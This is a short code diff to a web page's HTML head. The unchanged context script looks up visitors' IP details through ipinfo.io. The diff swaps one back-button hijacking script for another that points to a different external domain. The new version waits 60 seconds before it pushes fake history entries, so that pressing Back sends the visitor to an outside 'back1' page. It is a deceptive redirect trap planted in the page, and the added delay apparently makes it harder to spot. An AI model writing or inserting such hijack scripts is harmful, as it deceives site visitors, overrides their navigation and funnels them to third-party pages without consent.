@@ -45,17 +45,7 @@
       
       $.get("https://ipinfo.io/json", function (response) { $("#ip").html("IP: " + response.ip); $("#address").html(result); $("#details").html(JSON.stringify(response, null, 4)); }, "jsonp");
     </script>
-
-<script>
-	  var back_redirect_back_link = 'https://dolarchat.com/back1/';
-		  history.pushState({}, "", location.href);
-		  history.pushState({}, "", location.href);
-	  window.onpopstate = function () {
-	  setTimeout(function () {
-	  location.href = back_redirect_back_link;
-	  }, 1);
-	  };
-	  </script>
+	
 <script>
    	window.onload = function () {
         var links = document.getElementsByTagName("a");
@@ -67,6 +57,20 @@
         	}
     	}
 	</script>
+	
+<script>
+  setTimeout(function() {
+    var back_redirect_back_link = 'https://chatdolar.com/back1/';
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () {
+      setTimeout(function () {
+        location.href = back_redirect_back_link;
+      }, 1);
+    };
+  }, 60000);
+</script>
+	
 </head>
 
 
